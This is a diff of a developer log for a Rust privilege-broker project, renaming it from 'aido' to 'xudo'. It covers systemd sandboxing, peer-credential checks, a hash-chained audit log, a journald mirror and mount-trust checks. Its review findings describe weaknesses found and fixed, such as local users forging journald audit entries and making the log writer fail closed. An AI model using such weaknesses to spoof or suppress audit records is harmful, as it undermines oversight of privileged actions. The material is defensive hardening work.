   `PrivateNetwork`, `RestrictAddressFamilies=AF_UNIX`, `ProcSubset=pid`, the
   kernel and clock protections, `SystemCallFilter=@system-service` minus
   `@privileged @resources`, `RuntimeMaxSec=30`, `TasksMax=4`, `LimitNOFILE=64`,
-  `CollectMode=inactive-or-failed`), and `tmpfiles.d/aido.conf` (`/run/aido`
-  `0755`, `/run/aido/req` `0700`). `aidod/tests/units.rs` includes all three
+  `CollectMode=inactive-or-failed`), and `tmpfiles.d/xudo.conf` (`/run/xudo`
+  `0755`, `/run/xudo/req` `0700`). `xudod/tests/units.rs` includes all three
   and asserts every security-relevant line against the constants the code
   uses, and refuses any key it does not know, because systemd ignores a
   misspelled directive with a warning. Checked against systemd 257 in
@@ -805,7 +805,7 @@ caller is `Unattested` until M4, and an entry only lets the gate run, through
   request by the D5 lane, `just units`, which was run against these units and
   passed), and `systemd-tmpfiles` creates both directories with those modes,
   by hand. The phase-3 layout table lists them.
-- **Audit**: one `aido_audit::Record` per connection as a JSON line on
+- **Audit**: one `xudo_audit::Record` per connection as a JSON line on
   standard error, which the unit sends to the journal, each the first of a
   chain of one. It is **not** routed through step 6's `AuditTrail` and
   `authorize`: that is plan item D1 (`docs/todo/m2b-finish-plan.md`), left
@@ -816,7 +816,7 @@ caller is `Unattested` until M4, and an entry only lets the gate run, through
 **Decisions worth knowing.**
 
 1. **Recovered work.** The first agent on this step died mid-build. Its move of
-   the front-end's `best_match` into `aido-policy` was superseded at the rebase
+   the front-end's `best_match` into `xudo-policy` was superseded at the rebase
    by step 2b's `evaluate_command`, which the broker now calls; nothing else of
    it was discarded.
 2. **The euid is compared on every rung, not only where `PIDFD_GET_INFO`
@@ -838,7 +838,7 @@ caller is `Unattested` until M4, and an entry only lets the gate run, through
    failed units by hanging up, which is also why the instances are collected.
 6. **A filtered system call fails with `EPERM` instead of killing the
    broker**, so the client still receives a refusal and the journal a record.
-7. **`ReadWritePaths=-/run/aido/req`**: with the dash, a missing spool lets the
+7. **`ReadWritePaths=-/run/xudo/req`**: with the dash, a missing spool lets the
    broker start and answer `spool_unusable` with the remediation, rather than
    systemd failing the instance before anything can say why. It widens
    nothing.
@@ -882,7 +882,7 @@ rejected operand, deny-list hit through a rule that allows a shell),
 spool: `a_planted_temporary_file_or_link_is_never_written_through`,
 `publishing_over_a_taken_name_is_refused_and_leaves_both_files_alone`,
 `a_spool_reached_through_a_symbolic_link_is_refused_even_a_root_owned_one`.
-On a real kernel with a separate peer process (`aidod/tests/linux.rs`,
+On a real kernel with a separate peer process (`xudod/tests/linux.rs`,
 without a branch on the kernel: the expected answer is computed from the
 version): `a_live_peer_is_named_on_the_rung_the_kernel_version_predicts`,
 `a_peer_that_exited_mid_identification_is_refused_while_its_number_is_still_its_own`
@@ -893,15 +893,15 @@ and `a_real_client_is_identified_decided_and_minted_for_end_to_end`. The
 binary: `a_socket_activation_environment_it_never_asked_for_changes_nothing`
 and `a_descriptor_zero_that_is_not_a_stream_socket_is_refused_with_a_record`.
 The socket-kind check in front of `SO_PEERCRED`, on a real kernel in
-`aido-sys`: `peer_credentials_of_a_connected_datagram_socket_are_refused_rather_than_decoded`,
+`xudo-sys`: `peer_credentials_of_a_connected_datagram_socket_are_refused_rather_than_decoded`,
 `peer_credentials_of_a_tcp_connection_are_refused_rather_than_decoded`, and
 `peer_credentials_of_a_socket_with_no_peer_are_refused_rather_than_decoded`.
 The units: `the_unit_never_puts_the_broker_in_a_pid_namespace_of_its_own` and
 the unknown-directive refusal.
 
-**Outside the step.** `justfile` and CI exclude `aidod-bin` from coverage with
+**Outside the step.** `justfile` and CI exclude `xudod-bin` from coverage with
 its reason, and `CLAUDE.md` says three entry points are excluded and lists the
-two new crates. `rustix` in `aido-sys` gains the `net`, `process`, `event`,
+two new crates. `rustix` in `xudo-sys` gains the `net`, `process`, `event`,
 `time`, and `rand` features of the crate already in the tree; no new crate.
 
 **Review fixes.** The independent review found seven things. The socket unit
@@ -914,7 +914,7 @@ A client that connects and exits is the client's fault, not the broker's:
 and a full spool exit 0 (`a_client_that_connects_and_exits_cannot_make_the_broker_exit_as_broken`).
 The rest are open items 2, 8, 9 and 10 below, and snapshots for the refusal
 codes, their remediation sentences, and the audit records
-(`aido-wire/tests/contract_snapshots.rs`, `aidod/tests/record_snapshots.rs`;
+(`xudo-wire/tests/contract_snapshots.rs`, `xudod/tests/record_snapshots.rs`;
 `renaming_a_refusal_code_breaks_the_wire_contract_and_this_test`).
 
 **Open.**
@@ -922,7 +922,7 @@ codes, their remediation sentences, and the audit records
 1. **The gate's half (step 4).** It must find the entry by its caller's pin,
    validate it, and remove it, which is what makes the nonce one-use; the
    broker's "one live entry per caller" relies on that removal. It must read
-   the clock through `aido_sys::HostClock`. `CLOCK_MONOTONIC` is per time
+   the clock through `xudo_sys::HostClock`. `CLOCK_MONOTONIC` is per time
    namespace; an unprivileged caller cannot be root inside one it created, so
    the broker and the gate should always read the same clock, but step 4
    should confirm it rather than assume it.
@@ -956,21 +956,21 @@ codes, their remediation sentences, and the audit records
    belongs (see item 10).
 6. **The audit trail is not wired: plan item D1 is the explicit next step
    (decided 2026-10-21, at B1, not to half-wire it).** Step 7 is wired. Step
-   6, `aido_sys::audit::{AuditTrail, authorize}`, is not: the broker's half of
+   6, `xudo_sys::audit::{AuditTrail, authorize}`, is not: the broker's half of
    it is not a contained change, which is the finish plan's test for doing it
    now, and its parts are one piece. The broker keeps its stderr record and
    mints under the stopgap of open item 9.
    * **No receipt without the real trail.** `AuditReceipt` and `Authorized`
-     can be made only inside `aido_sys::audit`, so the mint cannot take "an
+     can be made only inside `xudo_sys::audit`, so the mint cannot take "an
      authorization whose record went to standard error" unless a weaker sink
      is added to that module, and a receipt that sometimes means "the chain
      holds the record" and sometimes "a line was written" would say less than
      the type says now. The only honest source of one is
-     `AuditTrail::system("aidod")`.
+     `AuditTrail::system("xudod")`.
    * **The unit must reach the trail**, a sandbox change that cannot be
-     tested here: `/var/lib/aido` writable (`ReadWritePaths=` and a
+     tested here: `/var/lib/xudo` writable (`ReadWritePaths=` and a
      `tmpfiles.d` line making it `0700 root`; the only writable path today is
-     `-/run/aido/req`), the journal socket reachable under
+     `-/run/xudo/req`), the journal socket reachable under
      `ProtectSystem=strict` (connecting to a socket is not a write to the
      filesystem, but nothing here has run it), the system-call filter checked
      against the calls the log and the journal sender make, and the trust walk
@@ -984,7 +984,7 @@ codes, their remediation sentences, and the audit records
    * The mint takes an `Authorized<MintApproval>` (`impl Approval`: command
      and governing action), which changes `publish` and `Minting`.
    * Open item 9's stderr attestation is replaced by the trail itself, and its
-     test with it; the `aidod-bin` process tests, which run unprivileged and
+     test with it; the `xudod-bin` process tests, which run unprivileged and
      read the records from standard error, then need a trail they can reach
      through a seam the binary does not have.
    * Whether "the record could not be written" gets a refusal code of its own
@@ -994,8 +994,8 @@ codes, their remediation sentences, and the audit records
    The order for whoever does it (D1, which also covers the gate): the unit
    and `tmpfiles` first, measured under systemd in Docker; then the seam; then
    `authorize` around the mint. Until then no record of the broker is chained
-   or hash-linked, and `aido audit --log` has nothing of the broker to verify.
-7. Seen, not changed: the front-end reads `/etc/aido/config.toml` by path and
+   or hash-linked, and `xudo audit --log` has nothing of the broker to verify.
+7. Seen, not changed: the front-end reads `/etc/xudo/config.toml` by path and
    the broker through the trust walk. They parse it identically; only the
    broker's reading is trusted, which is as it should be.
 8. **RESOLVED 2026-10-21 (B1). Decision, the user's, 2026-10-19: a sixth
@@ -1004,7 +1004,7 @@ codes, their remediation sentences, and the audit records
    kernel writes 0 for a socket with no peer, for a socket type that records
    none (a connected datagram socket, TCP), and for a peer outside the
    caller's pid namespace: undefined behaviour in 1.1.4 and 1.1.5 alike. The
-   user chose to decode `SO_PEERCRED` into plain integers in `aido-sys-raw`
+   user chose to decode `SO_PEERCRED` into plain integers in `xudo-sys-raw`
    (commit `829f41d`, `Syscalls::peer_cred`; see "the sixth `unsafe` block" at
    the end of this file), and the broker now reads the record through it:
    `HostPeer::peer_cred` is the socket-kind check (a connected `AF_UNIX`
@@ -1043,7 +1043,7 @@ codes, their remediation sentences, and the audit records
      putting the call back: clippy for `x86_64-unknown-linux-gnu` reports "use
      of a disallowed method".
    * **`nothing_reads_so_peercred_through_rustix_anywhere_in_the_workspace`**
-     (`aido-sys-raw/tests/unsafe_budget.rs`) looks for the name as a token,
+     (`xudo-sys-raw/tests/unsafe_budget.rs`) looks for the name as a token,
      comments and strings aside, in every Rust file of every crate and of the
      fuzz crate, on every host. Checked by putting the call back: it fails and
      names `peer.rs`. Beside it,
@@ -1052,20 +1052,20 @@ codes, their remediation sentences, and the audit records
      `the_peercred_scan_finds_every_spelling_of_the_call_and_nothing_that_is_not_one`
      tests the scanner.
 
-   **The unit-file note that `/run/aido` must not be shared across pid
+   **The unit-file note that `/run/xudo` must not be shared across pid
    namespaces is kept, for a different reason.** It no longer guards against
    undefined behaviour: a peer the broker cannot see is a clean refusal.
    What it guards against is systemd's own behaviour, measured on systemd
    257.13 (Debian trixie, in Docker, with a second container sharing the
    socket's volume as the peer). With `MaxConnectionsPerSource=` set, as
-   `aidod.socket` has it, one connection from a peer outside systemd's pid
+   `xudod.socket` has it, one connection from a peer outside systemd's pid
    namespace made systemd log "Failed to get peer credentials of socket: No
    data available" and fail the whole socket (`Result: resources`) until an
    administrator restarts it, and the broker was never started. Without that
    setting systemd started an instance, `…@0-unknown.service`, and the
    broker's own refusal was the only guard. So the broker is safe either way,
    and the cost of the per-uid bound is stated rather than left to be found:
-   `/run/aido` must never be reachable from a pid namespace that systemd
+   `/run/xudo` must never be reachable from a pid namespace that systemd
    cannot see into (a sibling container sharing it, or systemd itself in a
    container with a peer outside it). A container whose pid namespace is a
    descendant of systemd's is visible to it, by how the kernel nests pid
@@ -1073,7 +1073,7 @@ codes, their remediation sentences, and the audit records
    says so in the comment directly above the setting, and a test keeps it
    there: `the_per_source_limit_states_what_it_costs_beside_the_limit` reads
    only that block of comment, its wrapped lines joined, and requires the
-   measured cost and the rule's own sentence (`/run/aido must never be
+   measured cost and the rule's own sentence (`/run/xudo must never be
    reachable from a pid namespace`), so that deleting the rule or moving the
    note away from the limits fails it (checked by deleting the rule). Its
    first version searched the whole file above the limit, where those words
@@ -1091,7 +1091,7 @@ codes, their remediation sentences, and the audit records
    journal socket, ignoring"), and Rust reopens a closed descriptor 2 on
    `/dev/null`: every write then succeeds and records nothing. The broker now
    requires standard error to be a connected `AF_UNIX` stream socket before it
-   mints (`Platform::trail`, `aidod::trail_of`;
+   mints (`Platform::trail`, `xudod::trail_of`;
    `nothing_is_minted_when_standard_error_does_not_reach_the_journal`); a
    denial is answered regardless
    (`a_denial_is_answered_even_when_there_is_no_trail_to_write`). That is what
@@ -1099,8 +1099,8 @@ codes, their remediation sentences, and the audit records
    something else did not take the other end. The hash-chained sink of step 6
    is the real answer.
 10. **Step 7's mount-trust check and the unit's sandbox.** Inside the broker's
-   unit, `ReadWritePaths=-/run/aido/req` makes the spool a separate bind mount
-   (mountinfo shows `/aido/req /run/aido/req rw ... tmpfs`) on top of a
+   unit, `ReadWritePaths=-/run/xudo/req` makes the spool a separate bind mount
+   (mountinfo shows `/xudo/req /run/xudo/req rw ... tmpfs`) on top of a
    read-only `/run`, because `ProtectSystem=strict` marks every mount
    read-only; and `ProcSubset=pid` gives the broker its own `/proc` instance.
    The gate runs unsandboxed and sees a plain directory. The review's worry was
@@ -1155,8 +1155,8 @@ machine without Docker; both need it.
 in a `debian:trixie-slim` container (systemd 257.13), through `systemd-analyze
 verify` and `systemd-analyze security --offline`. It blocks from the start.
 Until B1 lands there is no `packaging/`; the lane says so and skips, so it
-merges first. Run against the broker's `aidod.socket` and `aidod@.service` as
-they stand on its branch (`7dcc41a`; its `tmpfiles.d/aido.conf` is not a unit
+merges first. Run against the broker's `xudod.socket` and `xudod@.service` as
+they stand on its branch (`7dcc41a`; its `tmpfiles.d/xudo.conf` is not a unit
 and is ignored) it passes, and that closes the broker's open item "The unit
 check is manual": its merge should replace that item with a pointer here. What
 building it measured, which is why it is built the way it is:
@@ -1165,11 +1165,11 @@ building it measured, which is why it is built the way it is:
    parse.** `NoNewPrivilegs=yes` and `RuntimeMaxSec=banana` each print one
    warning, are ignored, and leave the exit status 0. A hardening line that is
    ignored is a unit that starts without it, which is the case
-   `aidod/tests/units.rs` guards by refusing keys it does not know. So the check
+   `xudod/tests/units.rs` guards by refusing keys it does not know. So the check
    is that `verify` exits 0 *and says nothing*. It does exit 1 for a dependency no
    unit provides and for a missing section header.
 2. **`security` applies to services only.** Given a socket it scores what the
-   socket does not declare: `aidod.socket` came out 9.6 UNSAFE. A socket's keys
+   socket does not declare: `xudod.socket` came out 9.6 UNSAFE. A socket's keys
    are held by `verify` and by `units.rs`, and by nothing else.
 3. **The ceiling is 1.2** (`unit_exposure_max`, at the top of the justfile;
    `--threshold` takes whole tenths). The broker's service scores 1.1, on arm64
@@ -1195,13 +1195,13 @@ building it measured, which is why it is built the way it is:
 5. **The programs are stubbed.** `verify` refuses a unit whose `ExecStart=` is
    not an executable file, and the programs are not in the repository, so each
    absolute path a unit names gets a stand-in. What is checked is the unit, not
-   that the package installs `/usr/libexec/aido/aidod` there; that is phase 3's
+   that the package installs `/usr/libexec/xudo/xudod` there; that is phase 3's
    test of the package. A template is verified under systemd's dummy instance
-   (`aidod@test_instance.service`), which is the "and an instance" the by-hand
+   (`xudod@test_instance.service`), which is the "and an instance" the by-hand
    check did separately.
 
 Not covered, and still by hand: `systemd-tmpfiles` creating the two directories
-with their modes from `tmpfiles.d/aido.conf` (the textual lines are
+with their modes from `tmpfiles.d/xudo.conf` (the textual lines are
 `units.rs`'s), and anything about `sysusers.d` once it exists.
 
 **The root lane: `just root-test`, `ci/root-test.sh`.** The mirror of
@@ -1210,7 +1210,7 @@ with the checkout mounted read-only, for what only root can observe.
 
 1. **Only `root_*` test targets, not the whole workspace.** D5 as written named
    `cargo test --workspace --features root-tests`, which would run the existing
-   suite as root. Measured: five `aido-sys` unit tests fail there
+   suite as root. Measured: five `xudo-sys` unit tests fail there
    (`a_checkout_is_not_root_owned_on_the_walk`,
    `a_real_directory_owned_by_the_test_user_is_refused`,
    `an_untrusted_ruleset_is_refused_before_it_is_parsed`,
@@ -1221,7 +1221,7 @@ with the checkout mounted read-only, for what only root can observe.
    lane runs `cargo test --workspace --features root-tests --test 'root_*'`, one
    test at a time, with their output shown.
 2. **A cargo feature selects the tests; nothing reads the environment.** The
-   feature is `root-tests`, declared in `aido-sys`, which the install executor
+   feature is `root-tests`, declared in `xudo-sys`, which the install executor
    lives in. The suites that enable every feature (`just test`, `just
    linux-test`, coverage) build the root tests and run them as an ordinary user,
    where they return early and print `SKIPPED:`, the idiom of the `nix` crate.
@@ -1232,7 +1232,7 @@ with the checkout mounted read-only, for what only root can observe.
    summaries, so a lane that ran none fails too. A `[[test]]` entry with
    `required-features` means a run that forgot the feature errors ("requires the
    features") rather than running an empty binary and passing.
-3. **What it holds today is its own tripwire**, `aido-sys/tests/root_lane.rs`:
+3. **What it holds today is its own tripwire**, `xudo-sys/tests/root_lane.rs`:
    real, effective, saved, and filesystem uid and gid all 0; a mode-0000 file
    readable, which is the reason `linux-test` never runs as root; a file given to
    another owner and moded 0440, then handed back (`CAP_CHOWN` and `CAP_FOWNER`,
@@ -1284,10 +1284,10 @@ and the failing cases above shown failing.
 
 Requested: time-limited permissions that let a harness run something for a
 while without asking each time, default 30 minutes, for a single permission or
-a whole permission set (`aido set-temp nginx-reload 30m`, `... 24h`). Folded
+a whole permission set (`xudo set-temp nginx-reload 30m`, `... 24h`). Folded
 into the time-boxed grants M5 already planned, instead of a second mechanism,
 and specified in `howiwork.md` § Temporary permissions, spelled
-`aido grant <name> [duration]` to match the existing `grants`/`revoke` verbs.
+`xudo grant <name> [duration]` to match the existing `grants`/`revoke` verbs.
 
 The decisions that keep it inside the invariants: a grant can only activate
 what root's rules already define (a permission, a set, or a `grant-only`
@@ -1317,7 +1317,7 @@ made "live" mean both decision points, broker at mint and gate at exec.
 A Fable review of the milestone against main at `829f41d` (three of four
 lanes; the fourth timed out and its ground is covered by the others). Its
 substance: the four in-flight lanes — broker, doctor, gate, install — do not
-close M2b when they merge. `aido exec` (step 3), the executing differential
+close M2b when they merge. `xudo exec` (step 3), the executing differential
 (step 8), and the broker-plus-gate audit integration are separate exit
 blockers, and verification row 15 was marked done too early: the chain and the
 sinks are done, the end-to-end trail is not. Three documentation drifts were
@@ -1338,32 +1338,32 @@ rather than re-implement their lexers.
 
 ## 2026-10-19 — M2b step 6: the audit sinks
 
-**What exists.** `aido-sys::audit`: the contract the broker and the gate will
+**What exists.** `xudo-sys::audit`: the contract the broker and the gate will
 write through, and the two sinks behind it. Wired to neither binary; that is
 steps 2 and 4.
 
 - **The contract carries the rule.** `AuditSink::append` takes a function that
   builds the record from the chain's last record, calls it while the sink holds
-  the log, and checks the result with `aido_audit::follows` — the verifier's
+  the log, and checks the result with `xudo_audit::follows` — the verifier's
   own rule for one position, now shared by `verify` and every writer — before
   a byte is written. It returns an `AuditReceipt`, which only a sink in
-  `aido-sys` can make. `authorize(sink, approval, build)` moves the approval in
+  `xudo-sys` can make. `authorize(sink, approval, build)` moves the approval in
   and hands it back as `Authorized<T>` only with that receipt, and only for a
   record that describes it — its command and governing action
-  (`aido_audit::Approval`), checked before the write (review finding 6). On
+  (`xudo_audit::Approval`), checked before the write (review finding 6). On
   any error the approval given is dropped, and a record that says `denied`
   authorizes nothing (`RecordedAsRefusal`). The drop is not the guarantee —
   `Approved` is `Clone` — the types are: the broker's mint and the gate's exec
   are to take an `Authorized<_>`, so acting on an unrecorded approval is a
   type error rather than a review comment. A refusal needs no receipt: it is
   appended best-effort and stands either way.
-- **`JsonlLog`, the chain's authority, at `/var/lib/aido/audit.jsonl`.** The
+- **`JsonlLog`, the chain's authority, at `/var/lib/xudo/audit.jsonl`.** The
   directory through `open_trusted` (root-owned and not group- or
   world-writable from `/` down, no link); the file by `openat` on that
   descriptor, `O_RDWR|O_APPEND|O_CREAT|O_NOFOLLOW|O_CLOEXEC` at `0600`; `fstat`
   on the descriptor must show a regular file owned by root with no group or
   other bits and `st_nlink == 1`; an exclusive `flock`, waited for at most 5 s;
-  the last record found in the last 128 KiB (`aido_audit::continuation`); the
+  the last record found in the last 128 KiB (`xudo_audit::continuation`); the
   new record built, checked, and refused over 64 KiB; one write, `fdatasync`,
   an `fsync` of the directory with a log's first record, and the record sent
   to the trail's mirrors — all under the lock. Any failure from the write on
@@ -1374,12 +1374,12 @@ steps 2 and 4.
   `sendto`, with a 2 s send timeout. `MESSAGE` is one escaped,
   `term-sanitize`d, bounded line; `PRIORITY` is 5 for an authorization, 4 for a
   refusal, 1 for a refusal carrying the gate's `severity=high`;
-  `SYSLOG_FACILITY=10`, a fixed `MESSAGE_ID`, `AIDO_*` index fields, and
-  `AIDO_RECORD`, the file's line byte for byte, so the entries root sent can be
+  `SYSLOG_FACILITY=10`, a fixed `MESSAGE_ID`, `XUDO_*` index fields, and
+  `XUDO_RECORD`, the file's line byte for byte, so the entries root sent can be
   compared with the file record by record. The encoder is pure
-  (`aido-audit::journal`), snapshot-tested, and checked by a decoder written
+  (`xudo-audit::journal`), snapshot-tested, and checked by a decoder written
   from the protocol description. Every query of it starts from
-  `aido_audit::journal::query`, which matches `_UID=0` (review finding 1,
+  `xudo_audit::journal::query`, which matches `_UID=0` (review finding 1,
   below).
 - `AuditTrail::system(identifier)` is the log, then journald, both required.
   `FakeAuditSink` exists only under the `fake` feature, which only test builds
@@ -1387,16 +1387,16 @@ steps 2 and 4.
 
 **Decisions.**
 
-1. **`/var/lib/aido`, not `/var/log/aido`.** The design plan's file table and
+1. **`/var/lib/xudo`, not `/var/log/xudo`.** The design plan's file table and
    `todo/README.md` disagreed. On Ubuntu `/var/log` is `root:syslog 0775`, so
    nothing beneath it passes the ancestor walk — rightly, since the `syslog`
-   group can rename `/var/log/aido` aside. `/var/log` is also where rotation
-   truncates and where log2ram keeps files that never reach a disk. `aido-config`
+   group can rename `/var/log/xudo` aside. `/var/log` is also where rotation
+   truncates and where log2ram keeps files that never reach a disk. `xudo-config`
    names the path (`SystemPaths::audit_log`) and its unused `log` field is
    gone; the design-plan table and deviations block and the phase 3 packaging
-   notes say the same. The deny-list already protected `/var/lib/aido`
+   notes say the same. The deny-list already protected `/var/lib/xudo`
    (`writing_anything_that_decides_is_denied` now lists the file) and keeps
-   `/var/log/aido` as a former location.
+   `/var/log/xudo` as a former location.
 2. **The file is the authority and journald a required mirror**, the reverse of
    the plan's "journald primary". Only a file has a last record to continue
    from, and journald rate-limits without telling the sender. The send happens
@@ -1408,7 +1408,7 @@ steps 2 and 4.
    under `PAYLOAD_MAX` (96 KiB) and the stock ~208 KiB socket send buffer. A
    host tuned below that gets `EMSGSIZE`, which fails closed. Replayed into a
    real `systemd-journald` (Debian stable, in Docker): all three snapshotted
-   payloads were stored with every field, and each `AIDO_RECORD` parsed back.
+   payloads were stored with every field, and each `XUDO_RECORD` parsed back.
 4. **No `systemd-journal-logger` and no `/dev/log` fallback**, against the
    plan's dependency table: the protocol is a few dozen lines over rustix,
    already a dependency. The cost is open item 4.
@@ -1416,7 +1416,7 @@ steps 2 and 4.
    last line is refused (`TailError`): never continued past, never answered
    with a fresh `seq 1`. The one tolerated irregularity is a complete record
    missing its final newline. Repair is a person's: move the log aside, which
-   starts a new chain deliberately and keeps the evidence. `aido audit --log`
+   starts a new chain deliberately and keeps the evidence. `xudo audit --log`
    reports the same damage, or the first damage before it (review finding 4);
    the refusal names that command, because the front-end has no `verify`
    subcommand whatever older text calls it.
@@ -1430,10 +1430,10 @@ below (its journald-mirror defect is resolved by the same change as the
 durability one, item 2), and two hardening notes (item 8, and open item 10):
 
 1. **Anyone could forge an entry the documented query returned.** Any local
-   user can send journald a datagram with aido's `MESSAGE_ID`, `PRIORITY=1`,
-   and every `AIDO_*` field; reproduced against a real journald, where
-   `journalctl MESSAGE_ID=… AIDO_DECISION=denied` returned uid 1000's entry.
-   *Fixed:* `aido_audit::journal::query` renders the one query every alert
+   user can send journald a datagram with xudo's `MESSAGE_ID`, `PRIORITY=1`,
+   and every `XUDO_*` field; reproduced against a real journald, where
+   `journalctl MESSAGE_ID=… XUDO_DECISION=denied` returned uid 1000's entry.
+   *Fixed:* `xudo_audit::journal::query` renders the one query every alert
    rule and comparison starts from, `journalctl _UID=0 MESSAGE_ID=…`, and it
    excludes that entry (re-run: root's entry returned, uid 1000's not).
    `_UID` is the field journald takes from the kernel's credentials on the
@@ -1487,21 +1487,21 @@ durability one, item 2), and two hardening notes (item 8, and open item 10):
 4. **The writer refused endings the verifier called intact, and the refusal
    promised the verifier would name the line.** Past 128 KiB of blank space,
    or a last line longer than the window, the writer refused every decision
-   while `aido audit --log` printed "chain intact"; a non-UTF-8 tail it
+   while `xudo audit --log` printed "chain intact"; a non-UTF-8 tail it
    reported as an unreadable file, with no line. *Fixed:* one shared check.
-   `aido_audit::verify_log` — what `aido audit` now runs, on the file's bytes —
+   `xudo_audit::verify_log` — what `xudo audit` now runs, on the file's bytes —
    verifies every record and then asks `continuation_of` about the end: the
    writer's function, on the window `window_start` gives both of them. So
    every ending the writer refuses is reported, as the line when the damage
    is a line and as the writer's own refusal when it is not, and a non-UTF-8
    line is named by number (`Chain::from_jsonl_bytes`). The refusal now says
-   `aido audit --log` "reports it, or the first damage before it", which is
+   `xudo audit --log` "reports it, or the first damage before it", which is
    what it does. The review's reproduction, inverted:
    `a_blank_tail_the_writer_refuses_is_reported_by_the_verifier_too`; with
    `the_writer_and_the_verifier_agree_on_every_ending` (eleven endings, both
    answers), `audit_reports_an_ending_the_privileged_writer_refuses_instead_of_calling_it_intact`,
    and `audit_names_the_line_of_a_tail_that_is_not_text`. A consequence to
-   know: `aido audit` applies the privileged writer's end rule to whatever log
+   know: `xudo audit` applies the privileged writer's end rule to whatever log
    it reads, so an `ido` log whose last record runs past 128 KiB — `ido` caps
    none — is reported, though `ido` itself would continue it.
 5. **`FakeAuditSink` did not enforce `MAX_RECORD_BYTES`.** A builder padded
@@ -1515,9 +1515,9 @@ durability one, item 2), and two hardening notes (item 8, and open item 10):
    that the record was not `denied`, so a builder that recorded another argv
    or action still produced `Authorized<T>`; and "the approval is dropped" was
    claimed as a guarantee though `Approved` is `Clone` with public fields.
-   *Fixed, minimally:* `authorize` takes `T: aido_audit::Approval` — the
+   *Fixed, minimally:* `authorize` takes `T: xudo_audit::Approval` — the
    command and the governing action an approval must be recorded with,
-   implemented by `aido_gate::Approved` and used by its own
+   implemented by `xudo_gate::Approved` and used by its own
    `authorization_record` for `argv` — and passes `AuditSink::append_checked`
    a check that the built record carries exactly those, run after the record
    chains and before anything is written (`AuditError::Misrecorded`). The
@@ -1541,12 +1541,12 @@ durability one, item 2), and two hardening notes (item 8, and open item 10):
    `an_outcome_is_a_record_of_its_own_and_filling_one_in_is_tampering` pins
    the rule instead. The two cuts the file cannot show — truncation to zero,
    which restarts the chain at `seq 1`, and a cut at a record boundary, which
-   is continued — are stated as open item 5, and in `aido_audit::tail`.
+   is continued — are stated as open item 5, and in `xudo_audit::tail`.
 8. The `open_trusted` `O_DIRECTORY` hardening note is left to step 7, whose
    branch changes that function.
 
 **How the broker and the gate are to call it** (the module docs carry the same
-sketch): open `AuditTrail::system("aidod")` or `("aido-gate")`. On a refusal,
+sketch): open `AuditTrail::system("xudod")` or `("xudo-gate")`. On a refusal,
 `append` the record `refusal_record` builds and refuse whatever comes back. On
 an approval, `authorize` with `authorization_record`, act only through the
 `Authorized<_>`, and refuse when it errs. The receipt's `seq` is the audit id a
@@ -1595,17 +1595,17 @@ refusal; on a CI runner, the delivery.
    `seq 1`: it cannot tell an emptied log from a new one. A log cut back at a
    record boundary ends in a good record, so the next writer silently
    continues from it, and the verifier calls it intact. Both need root or a
-   disk fault, and neither is detected today. The `AIDO_SEQ` and `AIDO_HASH`
+   disk fault, and neither is detected today. The `XUDO_SEQ` and `XUDO_HASH`
    of the journal entries the trusted query finds would show both, but no tool
-   compares them; pasban is where that comparison belongs. `aido audit`
+   compares them; pasban is where that comparison belongs. `xudo audit`
    checks one file, defaults to `ido`'s per-user log, and needs
-   `--log /var/lib/aido/audit.jsonl` and root for the chain.
+   `--log /var/lib/xudo/audit.jsonl` and root for the chain.
 6. **The directory's own mode.** The walk demands root-owned and not group- or
    world-writable, not the table's `0700`. Loosened to `0755` on a host with
    `fs.protected_hardlinks=0`, a local user can hard-link the log and so make
    the writer refuse every decision: fail closed, availability only. Step 7's
-   mount check should cover `/var/lib/aido` as well as the ruleset.
-7. On a host with journald, the suite leaves one `SYSLOG_IDENTIFIER=aido-test`
+   mount check should cover `/var/lib/xudo` as well as the ruleset.
+7. On a host with journald, the suite leaves one `SYSLOG_IDENTIFIER=xudo-test`
    entry per run, under the real `MESSAGE_ID`. It carries the runner's `_UID`,
    so the trusted query excludes it; only a suite run as root, which
    `just linux-test` and CI never do, would leave one the query counts.
@@ -1639,7 +1639,7 @@ functions on macOS; `just check-linux` and clippy over every target for both
 Linux triples clean; `just linux-test` green on Linux 6.12 aarch64 as uid
 1000, the three lock races, the create race, and the socket tests included.
 The production path by hand as root in the same container, with no journald:
-`JsonlLog::system()` created `/var/lib/aido/audit.jsonl` `0600`, root's, one
+`JsonlLog::system()` created `/var/lib/xudo/audit.jsonl` `0600`, root's, one
 name; `AuditTrail::system` refused and left the log's size as it was; the
 next append was `seq 2`, and `verify_log` read two records. Not yet seen on
 the CI runners' 6.17.
@@ -1660,7 +1660,7 @@ checks cannot see this. Only the mount table can.
 
 `open_trusted`, `read_trusted_dir`, and `load_trusted_rules` now match every
 descriptor they open — each path component and each rule file — to its mount,
-and judge the mount (`crates/aido-sys/src/mounts.rs`) before anything else the
+and judge the mount (`crates/xudo-sys/src/mounts.rs`) before anything else the
 filesystem says about the component is believed. Each component is opened
 `O_PATH`, which asks its filesystem nothing — crossing into the root of a FUSE
 mount does not reach the daemon — then its mount is judged, and only then are
@@ -1727,7 +1727,7 @@ through something running as root for them, and each leaves a mark:
   (`a_root_mounted_fuse_still_carries_the_marks_of_a_user_mount`).
 - **`nosuid` or `noexec`, for the ruleset only**: on every component of the
   path to the rules and every rule file, as the design plan asks of
-  `/etc/aido` (`MountPolicy::Ruleset`, used by `read_trusted_dir` and
+  `/etc/xudo` (`MountPolicy::Ruleset`, used by `read_trusted_dir` and
   `load_trusted_rules`). `fusermount3` and udisks2 mount `nosuid`; fstab's
   `user` and `users` imply `nosuid,noexec`, `owner` and `group` imply
   `nosuid`. The real user FUSE mount in the probe read
@@ -1736,7 +1736,7 @@ through something running as root for them, and each leaves a mark:
   mounts on a normal host carry it. `open_trusted`, which any other root-owned
   path goes through, does not refuse these two (`MountPolicy::RootPath`):
   root's own mounts carry them — systemd mounts `/run` `nosuid,nodev` on every
-  host, the gate's spool is `/run/aido/req`, and `/var`, with `/var/lib/aido`,
+  host, the gate's spool is `/run/xudo/req`, and `/var`, with `/var/lib/xudo`,
   is `nosuid` on some — so there they say nothing about who made the mount
   (`a_spool_on_a_nosuid_mount_opens_while_rules_there_are_refused`; on Linux,
   `procfs_is_refused_as_a_home_for_rules_by_its_mount` opens `/proc/sys`
@@ -1789,7 +1789,7 @@ needs 5.6. `mnt_id` is in fdinfo since 3.15 and `thread-self` exists since
 
 The table is read once per component, after that component's `O_PATH` open
 and while it is held, and once more for all the rule files together: five
-reads for `/etc/aido/rules.d` with no rule file in it. Never once up front: a
+reads for `/etc/xudo/rules.d` with no rule file in it. Never once up front: a
 mount id is handed to a new mount as soon as its old one is gone, and only an
 open descriptor keeps the mount it names alive, so a table read before the
